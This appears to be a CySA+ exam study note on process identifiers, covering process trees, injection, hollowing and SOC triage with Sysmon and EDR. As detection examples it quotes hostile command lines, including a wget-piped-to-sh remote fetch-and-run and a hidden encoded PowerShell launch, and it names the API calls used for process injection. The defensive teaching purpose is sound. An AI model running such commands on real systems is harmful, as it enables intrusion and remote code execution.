# PID — Process Identifier

## What it is

In **DayZ**, you log into a Chernarus server and the game hands every player a session ID. That ID is how the server tracks who fired the shot from the treeline, who looted the military tent, who got banned for glitching through a wall. The player name is cosmetic — the session ID is what the admin tools query against. Two "Survivors" can have the same name; only one has session ID `76561198XXXXXXXXX` at this exact moment, and when that session dies, the ID is gone forever.

That's exactly what a **PID** does on an operating system. Every running process gets a unique integer assigned by the kernel at spawn time. The process name (`powershell.exe`, `svchost.exe`, `bash`) is cosmetic and trivially spoofable — the PID is what the kernel uses to actually manage the thing.

Technically: a **Process Identifier (PID)** is a non-negative integer assigned by the operating system kernel to a process when it's created. It's unique while the process is alive, recycled after the process exits, and is the primary handle used by system calls, debuggers, EDR agents, and the analyst to interact with that process. On Linux, PID 1 is `init`/`systemd`. On Windows, PID 0 is the System Idle Process and PID 4 is the System process. Everything else gets whatever the kernel hands out next.

## Why it matters

For Objective **CS0-003 1.3**, PID is the pivot point for almost every endpoint investigation you'll ever run. When an EDR alert fires, the payload is going to include a PID. When you correlate Sysmon Event ID 1 (process creation) to Event ID 3 (network connection) to Event ID 11 (file write), the join key is the PID. When you tell the IR lead "the malicious process is contained," what you actually did was kill or isolate a specific PID on a specific host.

The PID is also where attackers play games. **Process hollowing**, **process injection**, **PID spoofing in parent-child relationships** — all of these abuse the fact that a process name lies but a PID, plus its creation metadata, doesn't. CySA+ tests whether you can read a process tree and spot the lie.

## Key facts

### Anatomy of a process record

Every process the OS tracks carries roughly the same metadata. Memorize the fields — they show up on the exam in process listings and Sysmon events.

| Field | What it is | Why an analyst cares |
|---|---|---|
| **PID** | Unique integer for this process | Pivot key for all correlation |
| **PPID** (parent PID) | PID of the process that spawned it | Process tree, lineage, spoofing detection |
| **Image / path** | Full path to the executable on disk | Legit binary in wrong location = red flag |
| **Command line** | Full argv string | Where `-EncodedCommand`, `-nop -w hidden`, base64 live |
| **User / SID** | Account context | SYSTEM running a user binary = escalation |
| **Hash** | SHA-256 of the image | VirusTotal lookup, IOC matching |
| **Start time** | When the kernel spawned it | Timeline correlation |
| **Network connections** | Sockets owned by this PID | Beacon detection, C2 attribution |

### Windows vs Linux

| | Windows | Linux |
|---|---|---|
| First user PID | PID 4 = System; user processes start higher | PID 1 = `init`/`systemd` |
| Enumeration | `tasklist`, `Get-Process`, Task Manager, Process Explorer | `ps`, `top`, `htop`, `/proc/<pid>/` |
| Kill | `taskkill /F /PID 1234`, `Stop-Process -Id 1234` | `kill -9 1234` |
| Parent visibility | Process Explorer, Sysmon EID 1 | `ps -ef`, `pstree` |
| Network → PID | `netstat -ano`, `Get-NetTCPConnection -OwningProcess` | `ss -tnp`, `lsof -i -P` |

The `-ano` flags on `netstat` are exam-relevant: `-a` all connections, `-n` numeric, `-o` show owning PID. That last flag is what turns "something is beaconing to 185.x.x.x" into "**PID 4892** is beaconing to 185.x.x.x, and PID 4892 is `powershell.exe` spawned by `winword.exe`."

### The process tree is the story

A single PID in isolation tells you almost nothing. The **parent-child chain** is the actual evidence. Examples of trees that should make your queue go red:

- `winword.exe` → `cmd.exe` → `powershell.exe -nop -w hidden -enc <base64>` — macro-borne payload, classic phishing detonation
- `services.exe` → `cmd.exe` → `whoami` — something just popped SYSTEM and is checking
- `sshd` → `bash` → `wget http://x.x.x.x/a.sh | sh` — post-exploitation on a Linux box
- `explorer.exe` → `rundll32.exe` with a path outside `System32` — DLL sideloading

Conversely, lineage that looks wrong:
- `lsass.exe` spawning a child process at all — `lsass` shouldn't have children. A child of `lsass` is **credential dumping** until proven otherwise.
- A PPID that points to a PID that exited an hour ago — **PPID spoofing**, the attacker used `CreateProcess` with an explicit parent handle to make the child look legitimate.

### Process injection and hollowing — when the PID lies

The PID is honest about *which process slot* is running. It is not honest about *what code* is running inside that slot.

- **Process injection** — attacker writes shellcode into another process's memory (`VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread`) and executes it. The PID still says `explorer.exe`; the threads inside are doing C2.
- **Process hollowing** — attacker spawns a legitimate process suspended, unmaps its image, writes malicious code into the same memory, and resumes it. PID looks normal; image on disk matches the hash; in-memory contents are malware.
- **Reflective DLL injection** — DLL loaded without touching disk, never appears in the module list.

This is why **EDR exists**. Disk-based AV checks the file hash and sees `explorer.exe` is clean. EDR watches the behavior of PID 1234 and notices `explorer.exe` just opened a raw socket to a non-Microsoft IP on port 443 and started AES-encrypted beacons every 60 seconds.

### Correlating PID across telemetry

The PID is the join key across all your endpoint data sources. A real triage looks like this:

1. **SIEM alert** — Sysmon EID 3 (network connection) to known C2 domain. Pull the PID and host.
2. **Sysmon EID 1** for that PID on that host — what's the image, command line, hash, PPID?
3. **PPID lookup** — walk up the tree to root cause. Was it `outlook.exe`? Then this is phishing.
4. **Sysmon EID 11** for that PID — what files did it write? Persistence artifact?
5. **Sysmon EID 13** for that PID — what registry keys did it touch? Run keys?
6. **EDR process timeline** — full behavioral trace for that PID from spawn to alert.
7. **Hash → VirusTotal / sandbox** — is the binary known bad? Submit to Cuckoo or Joe Sandbox if it's novel.

The PID is the thread. Pull it, the whole sweater comes apart.

### CompTIA exam traps

> **CompTIA exam trap:** PID uniqueness is **only guaranteed while the process is alive**. PIDs are recycled. If your forensic timeline shows PID 4892 spawning at 03:14 and a network connection from PID 4892 at 09:47, you cannot assume it's the same process unless start times and lineage match. CompTIA loves this in timeline-reconstruction questions.

> **CompTIA exam trap:** A **trusted process name is not a trusted process**. `svchost.exe` running outside `C:\Windows\System32\` is malware wearing a uniform. The exam will give you a process list where `lsass.exe` runs from `C:\Users\Public\` and expect you to flag it. The image **path** matters as much as the name.

> **CompTIA exam trap:** PPID spoofing is real. A child process can be created with an arbitrary parent handle via `UpdateProcThreadAttribute`. Don't trust PPID alone — correlate with **process start times** (child can't start before parent legitimately spawned it) and EDR behavioral telemetry.

> **CompTIA exam trap:** Killing the PID is **containment, not eradication**. The malware is still on disk, still in registry Run keys, still in scheduled tasks. CompTIA's IR phase order matters here — `Stop-Process` is containment work, not eradication.

### Tools that surface PIDs (objective-aligned)

- **Process Explorer** (Sysinternals) — graphical tree, signing info, strings in memory, network tab. The analyst's default Windows tool.
- **Sysmon** — Event ID 1 logs every process creation with PID, PPID, hash, command line, user. Feed it into the SIEM.
- **Wireshark** — doesn't show PIDs natively (it's a wire-level capture), but pair with `netstat -ano` on the host to map sockets to processes.
- **EDR consoles** (CrowdStrike, Defender for Endpoint, SentinelOne) — process trees, behavioral graphs, remote kill of a PID across the fleet.
- **Volatility / memory forensics** — `pslist`, `psscan`, `pstree`, `psxview` reconstruct PIDs from a memory image. `psxview` specifically catches PIDs that one source sees and another doesn't — classic rootkit indicator.
- **`strings` + hash + VirusTotal** — once you have the PID's image path, pull the binary, hash it, search VT, run strings for URLs and embedded indicators.

## SOC reality

- The 3am alert reads `Sysmon EID 1: powershell.exe (PID 8124) spawned by winword.exe (PID 4012), command line contains -EncodedCommand`. You don't need to decode it yet — the lineage is already the incident.
- **First L1 action** — pivot on PID 8124 in EDR. Pull the process tree, all network connections, all file writes. Acknowledge the ticket, do **not** kill the process yet; killing it before you've captured memory destroys evidence.
- **What the IR lead asks** — "What PID, what host, what user, what parent, has it talked to anything external, are there siblings on other hosts?" That last one is the lateral-movement question.
- **Never tell leadership "we killed it"** when you mean "we killed the PID." The persistence mechanism (scheduled task, Run key, service, WMI subscription) will respawn it on next reboot or next user login. Containment ≠ eradication.
- **Handoff** — L1 confirms the PID, captures process memory dump and command line, escalates to L2/IR. IR makes the call on network-isolating the host (which preserves the PID and its connections for analysis) vs killing the process (faster containment, evidence loss).

## Related concepts

[[Sysmon]] · [[EDR]] · [[Process Injection]] · [[Process Hollowing]] · [[Parent-Child Process Relationships]] · [[Command Line Logging]] · [[PowerShell Logging]] · [[Sysinternals]] · [[Volatility]] · [[netstat]] · [[Indicators of Compromise]] · [[Containment Eradication Recovery]] · [[Memory Forensics]] · [[Process Tree Analysis]]

*Source: VIRGIL knowledge base — 2026-05-11*